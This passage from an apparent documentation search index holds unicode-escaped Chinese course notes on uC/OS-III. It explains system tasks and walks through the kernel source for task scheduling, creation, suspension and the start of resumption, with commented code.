\u8fdb\u884c\u4efb\u52a1\u8c03\u5ea6","title":"9.6. \u89e3\u6302\u4efb\u52a1"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#97","text":"\u7a7a\u95f2\u4efb\u52a1 \uff1a\u662f\u7531\u5185\u6838\u521b\u5efa\u7684\u5728\u6ca1\u6709\u5176\u5b83\u4efb\u52a1\u5c31\u7eea\u65f6\u8fd0\u884c\u7684\u4e00\u79cd\u4efb\u52a1\u3002\u5b83\u7684\u4f18\u5148\u7ea7\u662f\u6700\u4f4e\u7684\uff0c\u4e0d\u80fd\u88ab\u5e94\u7528\u8f6f\u4ef6\u5220\u9664\u3002 \u7edf\u8ba1\u4efb\u52a1 \uff1a\u901a\u5e38\u662f\u7531\u5185\u6838\u521b\u5efa\u7684\u7edf\u8ba1\u8fd0\u884c\u65f6\u95f4\u7684\u4efb\u52a1\u3002\u5b83\u544a\u8bc9\u7528\u6237\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u4e86\u591a\u5c11CPU\u65f6\u95f4\uff0c\u901a\u5e38\u7528\u767e\u5206\u6bd4\u6765\u8868\u793a\u3002\uff08 \u6ce8\uff1a uC/OS-II \u4e2d\u53ef\u5229\u7528OSIdleCtr\u53d8\u91cf\u6765\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd \uff09","title":"9.7. \u4e00\u4e9b\u7279\u6b8a\u7684\u7cfb\u7edf\u4efb\u52a1"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#10","text":"\u4ee5\u4e0b\u5185\u5bb9\u53c2\u8003\u81ea \u300a\u03bcC/OS-III \u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b \u3002","title":"10. \u6e90\u7801\u5206\u6790"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#101","text":"\u9996\u5148\u770b\u4efb\u52a1\u8c03\u5ea6\u51fd\u6570 OSSched() void OSSched (void) { CPU_SR_ALLOC(); // \u8fd8\u5728\u4e2d\u65ad\u4e2d\uff0c\u4e0d\u80fd\u8fdb\u884c\u4efb\u52a1\u8c03\u5ea6 if (OSIntNestingCtr > (OS_NESTING_CTR)0) { return; } // \u8c03\u5ea6\u5668\u9501\u4f4f\u4e86\uff0c\u4e0d\u80fd\u8fdb\u884c\u4efb\u52a1\u8c03\u5ea6 if (OSSchedLockNestingCtr > (OS_NESTING_CTR)0) { return; } // \u5173\u4e2d\u65ad CPU_INT_DIS(); // \u627e\u51fa\u5c31\u7eea\u5217\u8868\u4e2d\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u4efb\u52a1\u7684\u4f18\u5148\u7ea7 OSPrioHighRdy = OS_PrioGetHighest(); // \u627e\u5230\u8be5\u4f18\u5148\u7ea7\u4e0b\u5bf9\u5e94\u7684\u7b2c\u4e00\u4e2a\u4efb\u52a1 OSTCBHighRdyPtr = OSRdyList[OSPrioHighRdy].HeadPtr; // \u5224\u65ad\u8be5\u4efb\u52a1\u662f\u5426\u8ddf\u5f53\u524d\u8fd0\u884c\u4efb\u52a1\u662f\u4e00\u6837\u7684 if (OSTCBHighRdyPtr == OSTCBCurPtr) { CPU_INT_EN(); return; } #if OS_CFG_TASK_PROFILE_EN > 0u // \u88ab\u5207\u6362\u5230\u7684\u4efb\u52a1\u7684\u5207\u6362\u6b21\u6570\u52a01 OSTCBHighRdyPtr->CtxSwCtr++; #endif // \u603b\u5f97\u4efb\u52a1\u5207\u6362\u6b21\u6570\u52a01 OSTaskCtxSwCtr++; // \u8c03\u7528\u4efb\u52a1\u5207\u6362\u7684\u5b8f OS_TASK_SW(); // \u4f7f\u80fd\u4e2d\u65ad CPU_INT_EN(); } \u9996\u5148\u5982\u679c\u662f\u5728\u4e2d\u65ad\u4e2d\u6216\u8005\u8c03\u5ea6\u5668\u88ab\u9501\u4f4f\uff0c\u5c31\u4e0d\u80fd\u76f4\u63a5\u8fdb\u884c\u8c03\u5ea6\u76f4\u63a5\u9000\u51fa\u3002\u4e2d\u65ad\u7684\u4ee3\u7801\u4e00\u822c\u505a\u7684\u90fd\u662f\u91cd\u8981\u5e76\u4e14\u6bd4\u8f83\u7b80\u5355\u7684\u4e8b\u60c5\uff0c\u4e2d\u65ad\u5fc5\u987b\u5148\u6267\u884c\u5b8c\u518d\u53bb\u6267\u884c\u4efb\u52a1\u76f8\u5173\u4ee3\u7801\u3002\u5982\u679c\u5728\u4e2d\u65ad\u4e2d\u8fdb\u884c\u4efb\u52a1\u8c03\u5ea6\uff0c\u4e0d\u4ec5\u4ec5\u4f1a\u5f71\u54cd\u7cfb\u7edf\u7684\u5b9e\u65f6\u6027\uff0c\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u4e0d\u80fd\u53ca\u65f6\u8fd0\u884c\uff0c\u800c\u4e14\u53ef\u80fd\u4f1a\u4ea7\u751f\u5f02\u5e38\uff08\u5173\u4e8e\u4e2d\u65ad\u4e2d\u8fdb\u884c\u4efb\u52a1\u5207\u6362\u5f15\u53d1\u7684\u5f02\u5e38\u5728\u7f51\u4e0a\u6709\u76f8\u5173\u7684\u6587\u7ae0\u2014\u2014\u300a\u7834\u574fSTM32\u4e2d\u65ad\u673a\u5236\u5f15\u53d1\u7684\u5f02\u5e38\u300b\u8fdb\u884c\u5206\u6790\uff0c\u5927\u5bb6\u53ef\u4ee5\u53bb\u770b\u4e0b\uff09\u3002 \u6839\u636e\u524d\u9762\u7684\u7b2c12\u7ae0\u7b2c13\u7ae0\u5173\u4e8e\u5c31\u7eea\u5217\u8868\u7684\u77e5\u8bc6\u5f88\u5bb9\u6613\u5c31\u627e\u51fa\u5c31\u7eea\u5217\u8868\u4e2d\u54ea\u4e00\u4e2a\u4f18\u5148\u7ea7\u6700\u9ad8\uff0c\u4e14\u8be5\u4f18\u5148\u7ea7\u54ea\u4e2a\u4efb\u52a1\u5e94\u8be5\u8fdb\u884c\u5207\u6362\u6267\u884c\uff0c\u7136\u540e\u5224\u65ad\u8be5\u4efb\u52a1\u662f\u4e0d\u662f\u8ddf\u5f53\u524d\u8fd0\u884c\u4efb\u52a1\u76f8\u540c\u3002\u5982\u679c\u76f8\u540c\u5c31\u4e0d\u7528\u8fdb\u884c\u8c03\u5ea6\uff0c\u5982\u679c\u4e0d\u540c\u5148\u5bf9\u4efb\u52a1\u5207\u6362\u7684\u6b21\u6570 OSTCBHighRdyPtr->CtxSwCtr \u8ddf\u7cfb\u7edf\u603b\u7684\u4efb\u52a1\u5207\u6362\u7684\u6b21\u6570 OSTaskCtxSwCtr \u8fdb\u884c\u66f4\u65b0\uff0c\u63a5\u7740\u6267\u884c\u8c03\u5ea6\uff0c\u8fd9\u4e2a\u65f6\u5019\u53ea\u662f\u8c03\u7528\u4e86\u5b8f OS_TASK_SW() \u3002 \u6709\u4e9b\u8bfb\u8005\u53ef\u80fd\u4f1a\u60f3\uff0c\u539f\u6765\u4efb\u52a1\u5207\u6362\u8fd9\u4e48\u7b80\u5355\uff0c\u5c31\u662f\u8c03\u7528\u4e86\u4e00\u4e2a\u5b8f\uff0c\u770b\u4f3c\u7b80\u5355\u7684\u4e1c\u897f\u5176\u5b9e\u4e0d\u7b80\u5355\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u5b8f\u53ea\u662f\u76f8\u5f53\u4e00\u4e2a\u5bfc\u706b\u7d22\uff0c\u540e\u9762\u4f1a\u201c\u5f15\u7206\u201d\u5176\u4ed6\u7684\u64cd\u4f5c 1 \u3002","title":"10.1. \u4efb\u52a1\u8c03\u5ea6\u51fd\u6570"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#102","text":"\u4efb\u52a1\u521b\u5efa\u51fd\u6570OSTaskCreate void OSTaskCreate (OS_TCB *p_tcb, CPU_CHAR *p_name, OS_TASK_PTR p_task, void *p_arg, OS_PRIO prio, CPU_STK *p_stk_base, CPU_STK_SIZE stk_limit, CPU_STK_SIZE stk_size, OS_MSG_QTY q_size, OS_TICK time_quanta, void *p_ext, OS_OPT opt, OS_ERR *p_err) { CPU_STK_SIZE i; #if OS_CFG_TASK_REG_TBL_SIZE > 0u OS_OBJ_QTY reg_nbr; #endif CPU_STK *p_sp; CPU_STK *p_stk_limit; CPU_SR_ALLOC(); // \u662f\u5426\u5b9a\u4e49\u5b89\u5168\u68c0\u67e5\u7684\u5b8f #ifdef OS_SAFETY_CRITICAL if (p_err == (OS_ERR *)0) { // \u5982\u679c\u4f20\u5165\u7684\u53c2\u6570p_err\u662f\u7a7a\u6307\u9488\uff0c\u90a3\u4e48\u5c06\u8fdb\u5165\u5b89\u5168\u5173\u952e\u5f02\u5e38\uff0c\u8fd9\u90e8\u5206\u9700\u8981\u7528\u6237\u81ea\u5df1\u7f16\u5199 OS_SAFETY_CRITICAL_EXCEPTION(); return; } #endif // \u662f\u5426\u542f\u52a8\u5b89\u5168\u5173\u952e #ifdef OS_SAFETY_CRITICAL_IEC61508 /* \u4e00\u65e6\u8c03\u7528OSSafetyCriticalStart\uff0cOSSafetyCriticalStartFlag\u5c31\u88ab\u7f6e\u4e3a36 DEF_TRUE,\u4e0d\u518d\u5141\u8bb8\u521b\u5efa\u5185\u6838\u5bf9\u8c61\u3002*/ if (OSSafetyCriticalStartFlag == DEF_TRUE) { *p_err = OS_ERR_ILLEGAL_CREATE_RUN_TIME; return; } #endif // \u4e0d\u80fd\u5728\u4e2d\u65ad\u4e2d\u8c03\u7528\u521b\u5efa\u4efb\u52a1\u51fd\u6570 #if OS_CFG_CALLED_FROM_ISR_CHK_EN > 0u if (OSIntNestingCtr > (OS_NESTING_CTR)0) { *p_err = OS_ERR_TASK_CREATE_ISR; return; } #endif // \u8fdb\u884c\u53c2\u6570\u68c0\u6d4b #if OS_CFG_ARG_CHK_EN > 0u // \u68c0\u6d4b\u53c2\u6570p_tcb\u662f\u5426\u4e3a\u7a7a\u6307\u9488 if (p_tcb == (OS_TCB *)0) { *p_err = OS_ERR_TCB_INVALID; return; } // \u68c0\u6d4b\u53c2\u6570p_task\u662f\u5426\u4e3a\u7a7a\u6307\u9488 if (p_task == (OS_TASK_PTR)0) { *p_err = OS_ERR_TASK_INVALID; return; } // \u68c0\u6d4b\u53c2\u6570p_stk_base\u662f\u5426\u4e3a\u7a7a\u6307\u9488 if (p_stk_base == (CPU_STK *)0) { *p_err = OS_ERR_STK_INVALID; return; } // \u5806\u6808\u81f3\u5c11\u5e94\u8be5\u5927\u4e8e\u6211\u4eec\u8bbe\u5b9a\u7684\u6700\u5c0f\u503cOSCfg_StkSizeMin if (stk_size < OSCfg_StkSizeMin) { *p_err = OS_ERR_STK_SIZE_INVALID; return; } // \u9650\u5236\u7684\u5806\u6808\u5927\u5c0f\u80af\u5b9a\u4e0d\u80fd\u8d85\u8fc7\u6574\u4e2a\u5806\u6808\u7684\u5927\u5c0f if (stk_limit >= stk_size) { *p_err = OS_ERR_STK_LIMIT_INVALID; return; } // \u4efb\u52a1\u4f18\u5148\u7ea7\u4e0d\u80fd\u5927\u4e8e\u8bbe\u7f6e\u7684\u6700\u5927\u4f18\u5148\u7ea7 if (prio >= OS_CFG_PRIO_MAX) { *p_err = OS_ERR_PRIO_INVALID; return; } #endif // \u5982\u679c\u5141\u8bb8\u5ef6\u8fdf\u63d0\u4ea4\uff0c\u90a3\u4e48\u4f18\u5148\u7ea7\u4e3a0\u7684\u4efb\u52a1\u662f\u5ef6\u8fdf\u63d0\u4ea4\u7684\uff0c\u4efb\u52a1\u4e0d\u80fd\u8bbe\u7f6e\u4e3a\u6b64\u4f18\u5148\u7ea7 #if OS_CFG_ISR_POST_DEFERRED_EN > 0u if (prio == (OS_PRIO)0) { if (p_tcb != &OSIntQTaskTCB) { *p_err = OS_ERR_PRIO_INVALID; return; } } #endif // \u6700\u4f4e\u4f18\u5148\u7ea7\u4e3a\u7a7a\u95f2\u4efb\u52a1\uff0c\u4efb\u52a1\u4e0d\u80fd\u8bbe\u7f6e\u4e3a\u6b64\u4f18\u5148\u7ea7 if (prio == (OS_CFG_PRIO_MAX - 1u)) { if (p_tcb != &OSIdleTaskTCB) { *p_err = OS_ERR_PRIO_INVALID; return; } } // \u521d\u59cb\u5316\u4efb\u52a1\u63a7\u5236\u5757 OS_TaskInitTCB(p_tcb); *p_err = OS_ERR_NONE; // \u521b\u5efa\u4efb\u52a1\u7684\u65f6\u5019\uff0c\u5982\u679c\u6709\u9009\u9879OS_OPT_TASK_STK_CHK\u548cOS_OPT_TASK_STK_CLR\uff0c // \u5219\u4ece\u4f4e\u5730\u5740\u5f00\u59cb\u5c06\u6240\u6709\u7684\u5806\u6808\u7a7a\u95f4\u521d\u59cb\u5316\u4e3a0\uff0c\u540e\u9762\u53ef\u4ee5\u8ba1\u7b97\u6700\u5927\u7684\u5806\u6808\u4f7f\u7528\u60c5\u51b5 if ((opt & OS_OPT_TASK_STK_CHK) != (OS_OPT)0) { if ((opt & OS_OPT_TASK_STK_CLR) != (OS_OPT)0) { p_sp = p_stk_base; for (i = 0u; i < stk_size; i++) { *p_sp = (CPU_STK)0; p_sp++; } } } // \u6839\u636e\u5806\u6808\u589e\u957f\u65b9\u5411\uff0c\u8ba1\u7b97\u9650\u5236\u5806\u6808\u7684\u90a3\u4e2a\u5730\u5740 #if (CPU_CFG_STK_GROWTH == CPU_STK_GROWTH_HI_TO_LO) p_stk_limit = p_stk_base + stk_limit; #else p_stk_limit = p_stk_base + (stk_size - 1u) - stk_limit; #endif // \u5bf9\u5806\u6808\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u521d\u59cb\u5316\u7684\u5185\u5bb9\u5c06\u5728\u7b2c\u4e00\u6b21\u8fdb\u884c\u4efb\u52a1\u5207\u6362\u7684\u65f6\u5019\u6062\u590d\u4e3a\u5bc4\u5b58\u5668\u7684\u503c // \u6700\u540e\u8fd4\u56de\u521d\u59cb\u5316\u5806\u6808\u540e\u8fd4\u56de\u5806\u6808\u6307\u9488\u3002 p_sp = OSTaskStkInit(p_task, p_arg, p_stk_base, p_stk_limit, stk_size, opt); // \u4fdd\u5b58\u4efb\u52a1\u5730\u5740\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20TaskEntryAddr p_tcb->TaskEntryAddr = p_task; // \u4fdd\u5b58\u4efb\u52a1\u53c2\u6570\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20TaskEntryArg p_tcb->TaskEntryArg = p_arg; // \u4fdd\u5b58\u4efb\u52a1\u7684\u540d\u79f0\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20NamePtr p_tcb->NamePtr = p_name; // \u4fdd\u5b58\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20Prio p_tcb->Prio = prio; // \u4fdd\u5b58\u4efb\u52a1\u7684\u5806\u6808\u6307\u9488\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20StkPtr p_tcb->StkPtr = p_sp; // \u4fdd\u5b58\u4efb\u52a1\u7684\u5806\u6808\u9650\u5236\u589e\u957f\u5730\u5740\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20StkLimitPtr p_tcb->StkLimitPtr = p_stk_limit; // \u4fdd\u5b58\u4efb\u52a1\u7684\u65f6\u95f4\u7247\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20time_quanta p_tcb->TimeQuanta = time_quanta; // \u5141\u8bb8\u8fdb\u884c\u65f6\u95f4\u7247\u8f6e\u8f6c\u8c03\u5ea6 #if OS_CFG_SCHED_ROUND_ROBIN_EN > 0u // \u5982\u679c\u8bbe\u7f6e\u65f6\u95f4\u7247time_quanta\u4e3a0\uff0c\u53c2\u6570\u65f6\u95f4\u7247\u8ba1\u6570\u503c\u4e3a\u9ed8\u8ba4\u7684OSSchedRoundRobinDfltTimeQuanta // \u4e3aOSCfg_TickRate_Hz/10u\uff0c\u5373100\uff0c\u5426\u5219\u4e3a\u53c2\u6570\u7684\u8bbe\u7f6e\u3002 if (time_quanta == (OS_TICK)0) { p_tcb->TimeQuantaCtr = OSSchedRoundRobinDfltTimeQuanta; } else { p_tcb->TimeQuantaCtr = time_quanta; } #endif // \u4fdd\u5b58\u4efb\u52a1\u7684\u62d3\u5c55\u5185\u5bb9\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20ExtPtr\uff0c\u8be5\u53c2\u6570\u4e3a\u65e0\u786e\u5207\u7c7b\u578b\u6307\u9488 p_tcb->ExtPtr = p_ext; // \u4fdd\u5b58\u4efb\u52a1\u5806\u6808\u7684\u4f4e\u5730\u5740\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20StkBasePtr p_tcb->StkBasePtr = p_stk_base; // \u4fdd\u5b58\u4efb\u52a1\u5806\u6808\u7684\u5927\u5c0f\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20StkSize p_tcb->StkSize = stk_size; // \u4fdd\u5b58\u4efb\u52a1\u521b\u5efa\u65f6\u7684\u9009\u9879\u5230\u4efb\u52a1\u63a7\u5236\u5757\u5143\u7d20Opt p_tcb->Opt = opt; // \u5982\u679c\u5141\u8bb8\u4f7f\u7528\u4efb\u52a1\u201c\u5bc4\u5b58\u5668\u201d #if OS_CFG_TASK_REG_TBL_SIZE > 0u // \u521d\u59cb\u5316\u4efb\u52a1\u7684OS_CFG_TASK_REG_TBL_SIZE\u4e2a\u201c\u5bc4\u5b58\u5668\u201d\u90fd\u4e3a0\u3002 // OS_CFG_TASK_REG_TBL_SIZE\u9ed8\u8ba4\u503c\u4e3a1 for (reg_nbr = 0u; reg_nbr < OS_CFG_TASK_REG_TBL_SIZE; reg_nbr++) { p_tcb->RegTbl[reg_nbr] = (OS_REG)0; } #endif // \u5982\u679c\u5141\u8bb8\u4f7f\u7528\u4efb\u52a1\u6d88\u606f\u961f\u5217 #if OS_CFG_TASK_Q_EN > 0u // \u521d\u59cb\u5316\u4efb\u52a1\u6d88\u606f\u961f\u5217 OS_MsgQInit(&p_tcb->MsgQ, q_size); #endif // \u8c03\u7528\u4efb\u52a1\u521b\u5efa\u65f6\u7684\u56de\u8c03\u51fd\u6570OSTaskCreateHook\uff0c\u7528\u6237\u53ef\u4ee5\u5bf9\u51fd\u6570 // OS_AppTaskCreateHookPtr\u8fdb\u884c\u7f16\u5199 OSTaskCreateHook(p_tcb); OS_CRITICAL_ENTER(); // \u7f6e\u5c31\u7eea\u4f18\u5148\u7ea7\u4f4d\u6620\u50cf\u8868\u4e2d\u76f8\u5e94\u4f18\u5148\u7ea7\u5904\u4e8e\u5c31\u7eea\u72b6\u6001 OS_PrioInsert(p_tcb->Prio); // \u5c06\u65b0\u521b\u5efa\u7684\u4efb\u52a1\u63d2\u5165\u5c31\u7eea\u5217\u8868\u672b\u5c3e OS_RdyListInsertTail(p_tcb); // \u5982\u679c\u5141\u8bb8\u8c03\u8bd5\u7684\u5b8f\uff08\u4e3b\u8981\u5c06\u5404\u79cd\u5185\u6838\u5bf9\u8c61\u4e32\u6210\u53cc\u5411\u94fe\u8868\uff0c\u4ee5\u65b9\u4fbf\u8c03\u8bd5\uff09 #if OS_CFG_DBG_EN > 0u // \u5c31\u5c06\u4efb\u52a1\u6dfb\u52a0\u5230\u4efb\u52a1\u7684\u53cc\u5411\u94fe\u8868\u4e2d OS_TaskDbgListAdd(p_tcb); #endif // \u66f4\u65b0\u4efb\u52a1\u6570\u76ee OSTaskQty++; /* Increment the #tasks counter */ // \u53ea\u6709\u7cfb\u7edf\u542f\u52a8\u4e86\u624d\u5f00\u59cb\u540e\u9762\u7684\u4efb\u52a1\u8c03\u5ea6 if (OSRunning != OS_STATE_OS_RUNNING) { // Return if multitasking has not started OS_CRITICAL_EXIT(); return; } OS_CRITICAL_EXIT_NO_SCHED(); // \u8fdb\u884c\u4efb\u52a1\u8c03\u5ea6 OSSched(); }","title":"10.2. \u4efb\u52a1\u521d\u59cb\u5316\u51fd\u6570"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#103","text":"\u4efb\u52a1\u6302\u8d77\u51fd\u6570OSTaskSuspend // \u662f\u5426\u5305\u542b\u6302\u8d77\u4efb\u52a1\u6216\u8005\u53d6\u6d88\u6302\u8d77\u4efb\u52a1\u7684\u76f8\u5173\u4ee3\u7801 #if OS_CFG_TASK_SUSPEND_EN > 0u void OSTaskSuspend (OS_TCB *p_tcb, OS_ERR *p_err) { CPU_SR_ALLOC(); // \u662f\u5426\u5b9a\u4e49\u5b89\u5168\u68c0\u67e5\u7684\u5b8f #ifdef OS_SAFETY_CRITICAL if (p_err == (OS_ERR *)0) { // \u5982\u679c\u4f20\u5165\u7684\u53c2\u6570p_err\u662f\u7a7a\u6307\u9488\uff0c\u90a3\u4e48\u5c06\u8fdb\u5165\u5b89\u5168\u5173\u952e\u5f02\u5e38\uff0c\u8fd9\u90e8\u5206\u9700\u8981\u7528\u6237\u81ea\u5df1\u7f16\u5199 OS_SAFETY_CRITICAL_EXCEPTION(); return; } #endif // \u4e2d\u65ad\u4e2d\u4e0d\u5141\u8bb8\u8c03\u7528\u4efb\u52a1\u6302\u8d77\u51fd\u6570 #if OS_CFG_CALLED_FROM_ISR_CHK_EN > 0u if (OSIntNestingCtr > (OS_NESTING_CTR)0) { *p_err = OS_ERR_TASK_SUSPEND_ISR; return; } #endif // \u4e0d\u80fd\u6302\u8d77\u7a7a\u95f2\u4efb\u52a1 if (p_tcb == &OSIdleTaskTCB) { *p_err = OS_ERR_TASK_SUSPEND_IDLE; return; } // \u662f\u5426\u5141\u8bb8\u4e2d\u65ad\u5ef6\u8fdf\u63d0\u4ea4 #if OS_CFG_ISR_POST_DEFERRED_EN > 0u // \u5982\u679c\u6302\u8d77\u7684\u662f\u4e2d\u65ad\u5ef6\u8fdf\u63d0\u4ea4\u4efb\u52a1\uff0c\u5219\u8fd4\u56de\u9519\u8bef if (p_tcb == &OSIntQTaskTCB) { *p_err = OS_ERR_TASK_SUSPEND_INT_HANDLER; return; } #endif // \u8fdb\u5165\u4e34\u754c\u6bb5 CPU_CRITICAL_ENTER(); // \u5982\u679cp_tcb\u53c2\u6570\u4e3a\u7a7a\u6307\u9488\uff0c\u5219\u9ed8\u8ba4\u6302\u8d77\u7684\u662f\u5f53\u524d\u4efb\u52a1 if (p_tcb == (OS_TCB *)0) { p_tcb = OSTCBCurPtr; } // \u5982\u679c\u6302\u8d77\u7684\u662f\u5f53\u524d\u4efb\u52a1\uff0c\u540e\u9762\u5c31\u8981\u8fdb\u884c\u4efb\u52a1\u8c03\u5ea6\uff0c\u6240\u4ee5\u8981\u68c0\u67e5\u8c03\u5ea6\u5668\u662f\u5426\u88ab\u9501\u4f4f if (p_tcb == OSTCBCurPtr) { if (OSSchedLockNestingCtr > (OS_NESTING_CTR)0) { CPU_CRITICAL_EXIT(); *p_err = OS_ERR_SCHED_LOCKED; return; } } *p_err = OS_ERR_NONE; // \u9488\u5bf9\u6302\u8d77\u4efb\u52a1\u7684\u4e0d\u540c\u72b6\u6001\u8fdb\u884c\u4e0d\u540c\u7684\u5904\u7406 switch (p_tcb->TaskState) { // \u5c31\u7eea\u72b6\u6001 case OS_TASK_STATE_RDY: /*\u5728\u5141\u8bb8\u4e2d\u65ad\u5ef6\u8fdf\u7684\u60c5\u51b5\u4e0b\uff0c\u5f00\u4e2d\u65ad\u5e76\u4e14\u9501\u4f4f\u8c03\u5ea6\u5668\uff0c\u56e0\u4e3a\u4e0b\u9762\u64cd\u4f5c\u7684\u53d8\u91cf \u4e0d\u53ef\u80fd\u5728\u4e2d\u65ad\u4e2d\u88ab\u4f7f\u7528\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u9501\u4f4f\u8c03\u5ea6\u5668\u5373\u53ef\u3002\u5982\u679c\u4e0d\u5141\u8bb8\u4e2d\u65ad \u5ef6\u8fdf\uff0c\u8fd9\u91cc\u4f1a\u53d8\u6210\u4ec0\u4e48\u90fd\u4e0d\u505a\uff0c\u5b9e\u9645\u4e0a\u8fd9\u662f\u4e2a\u7a7a\u5b8f\uff0c\u56e0\u4e3a\u524d\u9762\u5df2\u7ecf\u5173\u4e2d\u65ad*/ OS_CRITICAL_ENTER_CPU_CRITICAL_EXIT(); // \u4efb\u52a1\u72b6\u6001\u53d8\u4e3a\u6302\u8d77\u72b6\u6001 p_tcb->TaskState = OS_TASK_STATE_SUSPENDED; // \u6302\u8d77\u7684\u5d4c\u5957\u5c42\u6570\u53d8\u4e3a1\uff0c\u4e4b\u524d\u6ca1\u6709\u88ab\u6302\u8d77 p_tcb->SuspendCtr = (OS_NESTING_CTR)1; // \u5c06\u4efb\u52a1\u4ece\u5c31\u7eea\u5217\u8868\u4e2d\u8131\u79bb OS_RdyListRemove(p_tcb); // \u9000\u51fa\u4e34\u754c\u6bb5 OS_CRITICAL_EXIT_NO_SCHED(); break; // \u5ef6\u8fdf\u72b6\u6001 case OS_TASK_STATE_DLY: p_tcb->TaskState = OS_TASK_STATE_DLY_SUSPENDED; p_tcb->SuspendCtr = (OS_NESTING_CTR)1; CPU_CRITICAL_EXIT(); break; // \u6302\u8d77\u7684\u72b6\u6001 case OS_TASK_STATE_PEND: p_tcb->TaskState = OS_TASK_STATE_PEND_SUSPENDED; p_tcb->SuspendCtr = (OS_NESTING_CTR)1; CPU_CRITICAL_EXIT(); break; // \u6b63\u5728\u7b49\u5f85\u4e8b\u4ef6\u53d1\u751f\uff0c\u5e76\u4e14\u6709\u65f6\u95f4\u9650\u5236\u7684\u65f6\u5019 // \u6ce8\uff1aOS_STATUS_PEND_TIMEOUT\u8ddfOS_TASK_STATE_PEND_TIMEOUT\u7684\u542b\u4e49\u4e0d\u540c case OS_TASK_STATE_PEND_TIMEOUT: p_tcb->TaskState = OS_TASK_STATE_PEND_TIMEOUT_SUSPENDED; p_tcb->SuspendCtr = (OS_NESTING_CTR)1; CPU_CRITICAL_EXIT(); break; // \u4e4b\u524d\u5df2\u7ecf\u662f\u6302\u8d77\u72b6\u6001\uff0c\u53ea\u9700\u5c06\u5d4c\u5957\u5c42\u6570+1 case OS_TASK_STATE_SUSPENDED: case OS_TASK_STATE_DLY_SUSPENDED: case OS_TASK_STATE_PEND_SUSPENDED: case OS_TASK_STATE_PEND_TIMEOUT_SUSPENDED: p_tcb->SuspendCtr++; CPU_CRITICAL_EXIT(); break; default: CPU_CRITICAL_EXIT(); *p_err = OS_ERR_STATE_INVALID; return; } // \u8fdb\u884c\u4efb\u52a1\u8c03\u5ea6 OSSched(); } #endif","title":"10.3. \u4efb\u52a1\u6302\u8d77\u51fd\u6570"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/5.uCos%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E6%9C%BA%E5%88%B6%E5%92%8C%E4%BC%98%E5%85%88%E7%BA%A7%E4%BD%8D%E5%9B%BE%E7%AE%97%E6%B3%95/#104","text":"\u6062\u590d\u6302\u8d77\u4efb\u52a1\u51fd\u6570OSTaskResume // \u662f\u5426\u5305\u542b\u6302\u8d77\u4efb\u52a1\u6216\u8005\u53d6\u6d88\u6302\u8d77\u4efb\u52a1\u7684\u76f8\u5173\u4ee3\u7801 #if OS_CFG_TASK_SUSPEND_EN > 0u void OSTaskResume (OS_TCB *p_tcb, OS_ERR *p_err) { CPU_SR_ALLOC(); // \u662f\u5426\u5b9a\u4e49\u5b89\u5168\u68c0\u67e5\u7684\u5b8f #ifdef OS_SAFETY_CRITICAL if (p_err == (OS_ERR *)0) { // \u5982\u679c\u4f20\u5165\u7684\u53c2\u6570p_err\u662f\u7a7a\u6307\u9488\uff0c\u90a3\u4e48\u5c06\u8fdb\u5165\u5b89\u5168\u5173\u952e\u5f02\u5e38\uff0c\u8fd9\u90e8\u5206\u9700\u8981\u7528\u6237\u81ea\u5df1\u7f16\u5199 